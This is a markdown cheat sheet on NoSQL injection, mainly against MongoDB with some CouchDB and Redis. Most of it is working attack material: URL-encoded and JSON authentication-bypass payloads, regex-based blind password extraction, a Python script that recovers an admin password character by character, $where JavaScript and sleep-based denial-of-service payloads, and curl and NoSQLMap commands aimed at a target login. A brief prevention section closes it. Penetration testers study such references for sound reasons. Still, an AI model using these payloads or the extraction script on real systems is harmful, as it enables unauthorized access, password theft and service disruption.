# NoSQL Injection

## Description
NoSQL injection exploits vulnerabilities in NoSQL databases (MongoDB, CouchDB, Redis, etc.) where user input is incorporated into queries without proper sanitization. Unlike SQL injection, NoSQL injection often exploits JSON-based queries and database-specific operators.

## MongoDB Injection

### Authentication Bypass

#### Using $ne (Not Equal)
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

```
# URL encoded
username[$ne]=&password[$ne]=

# POST form data
username[$ne]=admin&password[$ne]=wrongpassword
```

#### Using $gt (Greater Than)
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

```
username[$gt]=&password[$gt]=
```

#### Using $regex
```json
{"username": "admin", "password": {"$regex": ".*"}}
```

```
username=admin&password[$regex]=.*
```

#### Using $in
```json
{"username": {"$in": ["admin", "administrator"]}, "password": {"$ne": ""}}
```

#### Using $exists
```json
{"username": {"$exists": true}, "password": {"$exists": true}}
```

### Common Bypass Payloads

#### URL Encoded (GET/POST)
```
username[$ne]=toto&password[$ne]=toto
username[$regex]=admin.*&password[$ne]=
username[$gt]=admin&password[$gt]=
username[$nin][]=admin&password[$ne]=
```

#### JSON Body
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$regex": "admin"}, "password": {"$ne": ""}}
{"username": {"$in": ["admin"]}, "password": {"$gt": ""}}
```

#### Where Clause Injection
```json
{"$where": "this.username == 'admin'"}
{"$where": "function(){return this.username == 'admin'}"}
```

### Data Extraction

#### Extract Field Length
```json
{"username": "admin", "password": {"$regex": ".{5}"}}
```
Try different lengths until you get a match.

#### Character-by-Character Extraction
```json
{"username": "admin", "password": {"$regex": "^a.*"}}
{"username": "admin", "password": {"$regex": "^ab.*"}}
{"username": "admin", "password": {"$regex": "^abc.*"}}
```

#### Python Script for Blind Extraction
```python
import requests
import string

url = "https://target.com/login"
chars = string.ascii_lowercase + string.digits
password = ""

while True:
    for c in chars:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{c}.*"}
        }
        response = requests.post(url, json=payload)

        if "success" in response.text:
            password += c
            print(f"[+] Found: {password}")
            break
    else:
        break

print(f"[+] Password: {password}")
```

### Operator Injection

```
$eq      - Equal
$ne      - Not equal
$gt      - Greater than
$gte     - Greater than or equal
$lt      - Less than
$lte     - Less than or equal
$in      - In array
$nin     - Not in array
$regex   - Regular expression
$exists  - Field exists
$or      - Logical OR
$and     - Logical AND
$not     - Logical NOT
$where   - JavaScript expression
$type    - Field type
```

### JavaScript Injection ($where)

```json
{"$where": "1==1"}
{"$where": "this.password.length > 0"}
{"$where": "this.username == 'admin' && this.password.length > 5"}
```

#### Time-Based Blind
```json
{"$where": "sleep(5000) || this.username == 'admin'"}
```

### NoSQL Injection in Different Contexts

#### Array Parameters
```
users[$elemMatch][username]=admin&users[$elemMatch][password][$ne]=
```

#### Projection Injection
```json
{"projection": {"password": 1}}
```

#### Aggregation Pipeline
```json
[{"$match": {"$where": "1==1"}}]
```

## CouchDB Injection

### Authentication Bypass
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

### View Exploitation
```
http://target.com:5984/_all_dbs
http://target.com:5984/database/_all_docs
```

## Redis Injection

### Command Injection
```
SET key "value"
SET key "value\r\nGET other_key"
```

### Lua Script Injection
```
EVAL "return redis.call('GET', KEYS[1])" 1 key
```

## Tools

### NoSQLmap
```bash
# https://github.com/codingo/NoSQLMap

# Run NoSQLMap
python nosqlmap.py

# Specify target
python nosqlmap.py -u "http://target.com/login"
```

### Burp NoSQLi Scanner
```
Install from BApp Store
Automatically detects NoSQL injection points
```

### Manual Testing
```bash
# Test with curl
curl -X POST "https://target.com/login" \
    -H "Content-Type: application/json" \
    -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# URL encoded
curl -X POST "https://target.com/login" \
    -d "username[\$ne]=&password[\$ne]="
```

## Detection Checklist

### Test These Payloads
```
# JSON body
{"param": {"$ne": ""}}
{"param": {"$gt": ""}}
{"param": {"$regex": ".*"}}

# Form/URL parameters
param[$ne]=value
param[$gt]=value
param[$regex]=.*

# Where clause
{"$where": "1==1"}
{"$where": "sleep(5000)"}
```

### Signs of Vulnerability
```
- Different responses with operators
- Login success with $ne payloads
- Errors revealing MongoDB/NoSQL
- Time delays with sleep() injection
```

## Payloads Summary

### Authentication Bypass
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$ne": "wrongpass"}}
{"username": {"$in": ["admin"]}, "password": {"$ne": ""}}
```

### Data Extraction
```json
{"username": "admin", "password": {"$regex": "^a.*"}}
{"username": "admin", "password": {"$regex": ".{8}"}}
{"$where": "this.password.match(/^admin/)"}
```

### Denial of Service
```json
{"$where": "sleep(10000)"}
{"username": {"$regex": ".*.*.*.*.*.*.*.*.*.*.*.*.*"}}
```

## Prevention

```javascript
// Use parameterized queries
db.users.findOne({
    username: sanitize(username),
    password: sanitize(password)
});

// Validate input types
if (typeof username !== 'string' || typeof password !== 'string') {
    throw new Error('Invalid input');
}

// Use mongoose schema validation
const userSchema = new Schema({
    username: { type: String, required: true },
    password: { type: String, required: true }
});

// Disable JavaScript execution
// In MongoDB config: security.javascriptEnabled: false
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
- https://nullsweep.com/nosql-injection-cheatsheet/
